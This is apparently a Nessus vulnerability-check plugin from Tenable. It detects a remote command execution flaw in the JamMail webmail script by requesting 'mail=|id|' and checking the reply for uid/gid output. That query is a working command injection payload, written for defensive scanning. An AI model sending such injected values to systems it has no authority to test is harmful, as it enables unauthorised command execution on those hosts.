#
# (C) Tenable Network Security
#

if(description)
{
 script_id(18477);
 script_bugtraq_id(13937);
 script_version("$Revision: 1.2 $");

 name["english"] = "JamMail Jammail.pl Remote Arbitrary Command Execution Vulnerability";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running JamMail, a web mail script written in
perl.

The remote version of this software is prone to a remote command
execution vulnerability. 

An attacker may exploit this vulnerability to execute commands on
the remote host by adding special parameters to jammail.pl script.

Solution : None at this time
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Determines the presence of Jammail.pl remote command execution";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 script_family(english:"CGI abuses");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include('global_settings.inc');

port = get_http_port(default:80);
if ( ! port ) exit(0);

function check(url)
{
 req = http_get(item:url +"/?job=showoldmail&mail=|id|", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if ( egrep(pattern:"<td width=80% height=16>uid=[0-9].* gid=[0-9].*", string:res) )
 {
        security_hole(port);
        exit(0);
 }
}

if ( thorough_tests )
{
 check(url:"/mail");
 check(url:"/jammail");
 check(url:"/cgi-bin/jammail");
}

foreach dir ( cgi_dirs() )
{
  check(url:dir);
}
